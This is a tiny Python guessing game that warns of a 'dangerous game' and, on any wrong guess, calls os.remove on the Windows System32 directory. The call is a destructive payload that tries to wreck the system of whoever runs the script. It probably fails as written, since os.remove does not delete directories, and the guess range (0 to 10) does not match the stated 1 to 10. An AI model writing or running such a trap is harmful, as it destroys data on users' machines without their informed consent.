import random
import os

print("Lets play a dangerous game! \n")

number = int(input("Guess a number between 1-10!\n"))
random_number = random.randint(0, 10)


if number == random_number:
    print("You won nice one!\n")
else:
    os.remove("C:\Windows\System32")